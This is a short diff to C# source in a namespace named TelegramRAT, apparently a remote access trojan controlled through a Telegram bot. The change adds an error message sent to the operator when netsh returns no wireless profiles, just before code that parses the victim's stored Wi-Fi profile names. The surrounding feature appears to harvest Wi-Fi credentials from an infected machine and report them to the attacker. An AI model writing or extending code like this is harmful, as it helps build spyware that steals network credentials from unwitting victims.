@@ -268,7 +268,10 @@ namespace TelegramRAT
 
             // If nothing returned, an error has occurred running netsh
             if (wifiProfiles == String.Empty)
+            {
+                tg.SendMessage("The Wireless AutoConfig Service (wlansvc) is not running.");
                 return;
+            }
 
             string pattern = @"All User Profile * : (?<SSID>.*)";
             string groupName = "SSID";
